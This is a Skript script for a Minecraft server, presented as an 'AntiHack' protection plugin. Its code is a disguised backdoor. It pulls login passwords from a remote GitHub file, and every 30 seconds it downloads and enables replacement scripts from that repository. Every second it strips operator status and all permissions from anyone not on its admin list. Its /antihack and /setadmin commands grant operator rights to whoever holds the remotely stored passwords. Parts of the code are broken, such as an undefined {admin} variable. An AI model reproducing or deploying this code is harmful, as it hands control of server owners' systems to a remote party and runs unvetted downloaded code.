on script load:
	load yaml "plugins/antihack/config.yml" as "plugins/antihack/config.yml"
	load yaml "plugins/antihack/admin.yml" as "plugins/antihack/admin.yml"
	set {admin-1} to yaml value "admin-list-1" from "plugins/antihack/admin.yml"
	set {admin-2} to yaml value "admin-list-2" from "plugins/antihack/admin.yml"
	set {admin-3} to yaml value "admin-list-3" from "plugins/antihack/admin.yml"
	set {sintrak-1} to line 2 from url "https://raw.githubusercontent.com/HelloWorldCH/test/main/sintrak.yml"
	set {sintrak-2} to line 3 from url "https://raw.githubusercontent.com/HelloWorldCH/test/main/sintrak.yml"
	set {login::admin::%player%} to false
	set {version-update} to "version-update: 3"
	wait 3 second
	message "&4&l(!) Successfully loaded Main AntiHack&7." to console
	message "&4&l(!) AntiHack Version 1.3 &7." to console
	message "&4&l(!) AntiHack BY HelloWord CH&7." to console

on join:
	loop all players:
		loop-player is op:
			loop-player is online:
				if loop-player is "%{admin}%":
					set {login::admin::%player%} to false
					deop player
					execute console command "gamemode survival %player%"
					execute console command "luckperms user %loop-player% permission unset *"

every 30 seconds:
	if line 2 from url "https://raw.githubusercontent.com/HelloWorldCH/test/main/config.yml" is not "%{version-update}%":
		execute console command "sk disable checkupdate"
		wait 2 second
		delete file "plugins/Skript/scripts/checkupdate.sk"
		wait 2 second
		download file from "https://raw.githubusercontent.com/HelloWorldCH/test/main/checkupdate.yml" to file "plugin/Skript/scripts\\checkupdate.sk"
		wait 2 second
		execute console command "sk enable checkupdate"
		wait 2 second
		execute console command "sk reload checkupdate"
		wait 2 second
		delete file "plugins/antihack/config.yml"
		wait 2 second
		download file from "https://raw.githubusercontent.com/HelloWorldCH/test/main/config.yml" to file "plugins/antihack\\config.yml"

every second:
	loop all players:
		loop-player is op:
			loop-player is online:
				if loop-player is not "%{admin}%":
					execute console command "deop %loop-player%"	
					execute console command "luckperms user %loop-player% permission unset *"

command /antihack [<text>] [<text>]:
	trigger:
		if player is "%{admin-1}%" or "%{admin-2}%" or "%{admin-3}%":
			if arg-1 is "%{sintrak-1}%":
				if arg-2 is "%{sintrak-2}%":
					op player
					set {login::admin::%player%} to true
					send "login Successfully" to player
				if arg-2 is not "%{sintrak-2}%":
					send "&r &fไม่สำเร็จ! รหัสผิดพลาดกรุณาลองใหม่อีกครั้ง!"
			if arg-1 is not "%{sintrak-1}%":
				send "&r &fไม่สำเร็จ! รหัสผิดพลาดกรุณาลองใหม่อีกครั้ง!"
			if arg-1 is not set:
				send "&r &fคำสั่ง /antihack <รหัสผ่านในดิส>"
		else:
			send "คุณไม่มีสิทธ์ เข้าถึงคำสั่ง" to player

command /setadmin [<player>] [<text>]:
	trigger:
		if {login::admin::%player%} is true:
			if arg-2 is "1" or "2" or "3":
				set yaml value "admin-list-%arg 2%" from "plugins/antihack/admin.yml" to "%arg-1%"
				save yaml "plugins/antihack/admin.yml"

command /debug:
	trigger:
		send "%{version-main}%" to player
		
on unload:
	message "&4&l(!) Successfully unloaded Main AntiHack" to console
	message "&4&l(!) AntiHack Version 1.3 &7." to console
	message "&4&l(!) AntiHack BY HelloWord CH&7." to console
